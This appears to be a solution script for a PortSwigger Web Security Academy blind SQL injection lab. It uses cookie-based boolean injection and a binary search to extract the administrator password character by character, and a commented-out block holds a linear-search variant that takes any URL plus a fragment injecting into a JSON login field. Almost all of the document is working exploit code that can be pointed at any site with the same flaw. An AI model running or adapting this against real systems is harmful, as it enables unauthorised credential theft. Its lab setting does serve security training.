import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


URL= 'https://0adc00690385f983c27162a400b40002.web-security-academy.net/'

def blindsql(url):
    password = ''
    for i in range(1,21):
        lo = 32
        hi = 128
        while(lo <= hi):
            mid = lo + (hi - lo) // 2
            sql_payload = "' and (select ascii(substring(password, %s, 1)) from users where username = 'administrator') > '%s'--" % (i,mid)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId' : 'aCYxD3y5INl4sST0' + sql_payload_encoded, 'session' : 'dAWkI5oaqVkZ1aA9wSOHoXhG5aUrVo1V'}
            r = requests.get(url=url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" in r.text:
                lo = mid + 1
            else:
                hi = mid - 1
                print("Not " + chr(lo) + " Retrying another character...")
        password += chr(lo)
        print("Found " + " character " + str(i) + "! :" + chr(lo))
    print("Password for administrator is : " + password)


blindsql(URL)
####################################################################################

"""
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'dCqiyv8E4BfhhpHL' + sqli_payload_encoded, 'session': 'bdb4dZfXEcfucciq98jCIYBJW4NL7y7M'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()

def sqli(pos,mid):
    data = {
        "username":"boxy_mcbounce' AND ascii(substr(password,%i,1))>%i -- -" % (pos,mid),
        "password":"a",
        "score":0
    }
    r = requests.post(host, json=data)
    print(data, r.text)
    return "Logging you" in r.text

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)
"""
